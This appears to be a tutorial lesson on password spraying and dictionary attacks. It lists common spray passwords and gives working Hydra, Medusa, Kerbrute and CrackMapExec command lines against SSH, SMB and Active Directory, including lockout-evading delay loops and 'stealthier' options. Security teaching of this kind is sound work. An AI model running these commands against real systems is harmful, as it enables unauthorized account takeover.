
## Lesson 01: Password Spraying and Dictionary Attack

---

# 1) Password Spraying 

Trying **one common password** across **many accounts**.

### Example
Users:
- xyz
- admin
- user1
- hr01

Password tried:
- Welcome@123

## Why attackers use it?
- Low chance of account lockout
- Very effective in real environments

## Common spray passwords
- Welcome@123
- Password@123
- Company@123
- Winter2026!
- Summer2026!

---

# 2) Dictionary Attack

Trying **many passwords** for **one account**.

### Example
User:
- admin

Passwords:
- admin123
- password
- qwerty
- letmein

## Why it is risky?
- High chance of account lockout
- Noisy / easily detected

---

# Key Difference 

| Attack Type | Attempts | Risk |
|---|---|---|
| Password Spraying | 1 password → many users | Low lockout risk |
| Dictionary Attack | many passwords → 1 user | High lockout risk |

---

# Common Tools 
- Hydra
- CrackMapExec (CME)
- Kerbrute (Active Directory)
- Medusa

### Dictionary attacks

#### Hydra
```bash
# Single username, wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt ssh://192.168.1.100:2222

# Limit parallel tasks (stealthier)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt ssh://192.168.1.100 -V
```

#### medusa
```
# SSH attack
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple hosts
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# Multiple users
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Parallel connections
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -t 5

# Available modules
medusa -d
```

### Password Spraying
#### 1. Kerbrute (Active Directory)
```bash
# Install
go install github.com/ropnop/kerbrute@latest

# Enumerate users (check if they exist)
./kerbrute userenum -d domain.local users.txt --dc 192.168.1.10

# Password spray
./kerbrute passwordspray -d domain.local users.txt "Summer2024!"

# With delay (stealthier)
./kerbrute passwordspray -d domain.local users.txt "Summer2024!" --delay 1000

# Multiple passwords
for pass in $(cat passwords.txt); do
    ./kerbrute passwordspray -d domain.local users.txt "$pass"
    sleep 1800  # Wait 30 minutes
done
```

#### 2. CrackMapExec (SMB/WinRM)
```bash
# Install
sudo apt install crackmapexec

# SMB password spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Single user test
crackmapexec smb 192.168.1.10 -u admin -p 'Password123!'

# Domain spray
crackmapexec smb 192.168.1.10 -u users.txt -p 'Summer2024!' -d domain.local

# With delay
for pass in "Summer2024!" "Welcome2024!" "Password123!"; do
    crackmapexec smb 192.168.1.10 -u users.txt -p "$pass"
    sleep 1800
done
```